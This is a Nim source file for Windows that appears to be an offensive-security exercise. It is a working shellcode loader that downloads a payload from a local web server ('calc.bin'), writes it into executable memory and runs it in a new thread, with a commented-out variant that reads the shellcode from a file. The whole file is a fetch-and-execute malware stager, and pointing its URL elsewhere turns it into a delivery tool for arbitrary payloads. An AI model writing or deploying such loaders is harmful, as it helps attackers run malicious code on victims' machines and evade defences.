import winim, strformat, strutils, httpclient, streams

# Status indicators
template success(s: varargs[untyped]): untyped = 
    echo "[+] ", s
template fail(s: varargs[untyped]): untyped = 
    echo "[-] ", s
template info(s: varargs[untyped]): untyped =
    echo "[*] ", s

const url = "http://127.0.0.1:9090/calc.bin"

proc run() : int = 
    # GetCurrentProcess: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
    info("Getting handle to current process")
    var pHandle = GetCurrentProcess() 
    if pHandle == 0:
        fail("Failed to get handle to current process: ", GetLastError())
        return ERROR
    success(fmt"> Got handle to current process: {pHandle}")

    # Fetch shellcode from remote web server
    info(fmt"Fetching payload from {url}")
    var response = newHttpClient().get(url)
    if response.status != "200 OK":
        fail(fmt"Failed to fetch payload from {url}: {response.status}")
        return ERROR
    var shellcode = response.bodyStream.readAll()
    success(fmt"> Read {shellcode.len} bytes from {url}")

    # Read shellcode from file 
    # var file = "../data/calc.bin"
    # var strm = newFileStream(file, fmRead)
    # info(fmt"Reading shellcode from file {file}")
    # if strm == nil:
    #     fail("Failed to open shellcode file: ", GetLastError())
    #     return ERROR
    # var shellcode = strm.readAll()
    # success(fmt"> Read {shellcode.len} bytes from file {file}")

    # VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    info("Allocating memory in process")
    var lpAddress = VirtualAllocEx(pHandle, nil, shellcode.len, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if lpAddress == nil:
        fail("Failed to allocate memory: ", GetLastError())
        return ERROR
    success(fmt"> Allocated {shellcode.len} bytes at base address {cast[ByteAddress](lpAddress)}")

    # WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    info("Writing shellcode to process memory")
    var bytesWritten: SIZE_T = 0
    if WriteProcessMemory(pHandle, lpAddress, &shellcode, shellcode.len, &bytesWritten) == 0:
        fail("Failed to write process memory: ", GetLastError())
        return ERROR
    success(fmt"> Wrote {bytesWritten} bytes.")

    # CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    info("Creating remote thread")
    var threadId: DWORD = 0
    var hThread = CreateRemoteThread(pHandle, nil, 0, cast[LPTHREAD_START_ROUTINE](lpAddress), nil, 0, &threadId)
    if hThread == 0:
        fail("Failed to create remote thread: ", GetLastError())
        return ERROR
    success(fmt"> Thread ID: {threadId}")
    success(fmt"> Thread handle: {hThread}")

    # WaitForSingleObject: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    info(fmt"Waiting for thread {hThread} to exit.")
    WaitForSingleObject(hThread, INFINITE)
    success("> Thread exited.")

    # CloseHandle: https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
    info("Closing process handle")
    CloseHandle(pHandle)
    info("Closing thread handle")
    CloseHandle(hThread)

    return SUCCESS

when isMainModule:
    discard run()